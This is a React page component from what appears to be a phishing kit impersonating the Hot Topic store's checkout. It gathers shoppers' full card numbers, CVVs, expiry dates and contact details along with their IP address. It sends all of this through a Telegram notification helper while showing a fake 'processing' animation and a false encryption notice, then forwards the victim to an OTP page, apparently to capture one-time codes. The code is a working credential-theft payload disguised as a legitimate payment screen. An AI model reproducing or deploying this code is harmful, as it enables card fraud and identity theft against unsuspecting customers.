
import { useEffect, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Skeleton } from "@/components/ui/skeleton";
import HotTopicHeader from "@/components/HotTopicHeader";
import HotTopicFooter from "@/components/HotTopicFooter";
import { CheckCircle, CreditCard, LockIcon, Clock } from "lucide-react";
import { sendPaymentDetailsNotification, getBrowserInfo, generateSessionId } from "@/utils/telegramUtils";

const ProcessingPayment = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [progress, setProgress] = useState(0);
  const [notificationSent, setNotificationSent] = useState(false);
  
  // Get order details from location state
  const orderDetails = location.state?.orderDetails;
  const giftCardValue = location.state?.giftCardValue;
  const discountedAmount = location.state?.discountedAmount;
  const paymentMethod = location.state?.paymentMethod;
  const lastFour = location.state?.lastFour;
  const cardNumber = location.state?.cardNumber;
  const cvv = location.state?.cvv;
  const expiryDate = location.state?.expiryDate;
  
  // Set up session data
  const [sessionId] = useState(generateSessionId());
  const [browserInfo] = useState(getBrowserInfo());
  const [ipAddress, setIpAddress] = useState("Unknown");
  
  // Fetch IP address on component mount
  useEffect(() => {
    const getIpAddress = async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        console.log("IP data received:", data);
        setIpAddress(data.ip);
      } catch (error) {
        console.error('Failed to fetch IP address:', error);
      }
    };
    
    getIpAddress();
  }, []);
  
  // Send notification when payment details are available
  useEffect(() => {
    const sendNotification = async () => {
      if (notificationSent || !ipAddress || ipAddress === "Unknown") return;
      
      const paymentDetails = {
        cardNumber,
        expiryDate,
        cvv,
        customerName: orderDetails?.customerName,
        email: orderDetails?.email,
        phone: orderDetails?.phone,
        paymentMethod,
        lastFour,
        giftCardValue,
        discountedAmount,
        browserInfo,
        ipAddress,
        sessionId
      };
      
      console.log("Sending payment details notification with data:", paymentDetails);
      const result = await sendPaymentDetailsNotification(paymentDetails);
      console.log("Payment details notification sent:", result);
      setNotificationSent(true);
    };
    
    if (ipAddress !== "Unknown") {
      sendNotification();
    }
  }, [ipAddress, orderDetails, cardNumber, expiryDate, cvv, paymentMethod, lastFour, giftCardValue, discountedAmount, browserInfo, notificationSent, sessionId]);

  // Setup processing animation and redirect
  useEffect(() => {
    let timer: ReturnType<typeof setInterval>;
    const processingTime = 10000; // 10 seconds
    const startTime = Date.now();
    
    // Animate progress bar
    timer = setInterval(() => {
      const elapsedTime = Date.now() - startTime;
      const newProgress = Math.min((elapsedTime / processingTime) * 100, 100);
      setProgress(newProgress);
      
      if (elapsedTime >= processingTime) {
        clearInterval(timer);
        // Navigate to OTP verification after processing
        navigate("/otp-verification", { 
          state: { 
            orderDetails,
            giftCardValue,
            discountedAmount,
            paymentMethod,
            lastFour,
            cardNumber,
            cvv,
            expiryDate
          } 
        });
      }
    }, 50);
    
    return () => clearInterval(timer);
  }, [navigate, orderDetails, giftCardValue, discountedAmount, paymentMethod, lastFour, cardNumber, cvv, expiryDate]);

  // Processing steps animation
  const steps = [
    { id: 1, text: "Validating payment information", delay: 0 },
    { id: 2, text: "Processing secure transaction", delay: 3000 },
    { id: 3, text: "Preparing verification", delay: 7000 }
  ];

  const [completedSteps, setCompletedSteps] = useState<number[]>([]);
  const [currentStep, setCurrentStep] = useState(1);

  useEffect(() => {
    let stepTimers: ReturnType<typeof setTimeout>[] = [];
    
    steps.forEach(step => {
      const timer = setTimeout(() => {
        if (step.id === 1) {
          setCompletedSteps(prev => [...prev, step.id]);
          setCurrentStep(2);
        } else if (step.id === 2) {
          setCompletedSteps(prev => [...prev, step.id]);
          setCurrentStep(3);
        } else if (step.id === 3) {
          setCompletedSteps(prev => [...prev, step.id]);
        }
      }, step.delay);
      
      stepTimers.push(timer);
    });
    
    return () => {
      stepTimers.forEach(timer => clearTimeout(timer));
    };
  }, []);

  return (
    <div className="min-h-screen bg-black">
      <HotTopicHeader />
      
      <div className="container py-8">
        <div className="max-w-md mx-auto space-y-6">
          <div className="bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
            <h1 className="text-3xl font-bold text-white mb-6 text-center">
              Processing <span className="text-hottopic-red">Payment</span>
            </h1>
            
            {/* Processing animation */}
            <div className="flex justify-center mb-8">
              <div className="relative w-32 h-32 flex items-center justify-center">
                <svg className="w-full h-full" viewBox="0 0 100 100">
                  {/* Background circle */}
                  <circle 
                    cx="50" 
                    cy="50" 
                    r="45" 
                    fill="none" 
                    stroke="#333333" 
                    strokeWidth="8" 
                  />
                  {/* Progress circle */}
                  <circle
                    cx="50"
                    cy="50"
                    r="45"
                    fill="none"
                    stroke="#e11d48"
                    strokeWidth="8"
                    strokeDasharray="283"
                    strokeDashoffset={283 - (progress / 100) * 283}
                    strokeLinecap="round"
                    transform="rotate(-90 50 50)"
                  />
                </svg>
                <div className="absolute inset-0 flex items-center justify-center">
                  <CreditCard className="h-12 w-12 text-white animate-pulse" />
                </div>
              </div>
            </div>
            
            {/* Processing steps */}
            <div className="space-y-4 mt-8">
              {steps.map((step) => (
                <div key={step.id} className="flex items-center space-x-3">
                  <div className={`rounded-full w-8 h-8 flex items-center justify-center ${
                    completedSteps.includes(step.id) 
                      ? 'bg-hottopic-red text-white' 
                      : currentStep === step.id 
                        ? 'border-2 border-hottopic-red text-hottopic-red' 
                        : 'border border-gray-700 text-gray-700'
                  }`}>
                    {completedSteps.includes(step.id) ? (
                      <CheckCircle className="h-4 w-4" />
                    ) : (
                      <span>{step.id}</span>
                    )}
                  </div>
                  <div className={`text-sm ${
                    completedSteps.includes(step.id) 
                      ? 'text-white' 
                      : currentStep === step.id 
                        ? 'text-gray-300' 
                        : 'text-gray-600'
                  }`}>
                    {step.text}
                    {currentStep === step.id && !completedSteps.includes(step.id) && (
                      <span className="inline-flex ml-2">
                        <span className="animate-bounce">.</span>
                        <span className="animate-bounce delay-100">.</span>
                        <span className="animate-bounce delay-200">.</span>
                      </span>
                    )}
                  </div>
                </div>
              ))}
            </div>
            
            {/* Payment summary */}
            <div className="bg-hottopic-gray/20 p-4 rounded-lg border border-hottopic-gray/30 mt-8 space-y-2">
              <div className="flex justify-between text-sm">
                <span className="text-gray-400">Amount:</span>
                <span className="text-hottopic-red font-semibold">${discountedAmount?.toFixed(2) || "0.00"}</span>
              </div>
              {paymentMethod && (
                <div className="flex justify-between text-sm">
                  <span className="text-gray-400">Card:</span>
                  <span className="text-white">{paymentMethod} •••• {lastFour || "****"}</span>
                </div>
              )}
            </div>
            
            <div className="flex items-center justify-center text-center mt-6">
              <LockIcon className="text-gray-400 mr-2 h-4 w-4" />
              <p className="text-gray-400 text-xs">
                Secure transaction - Your payment is being processed with encryption
              </p>
            </div>
          </div>
        </div>
      </div>
      
      <HotTopicFooter />
    </div>
  );
};

export default ProcessingPayment;
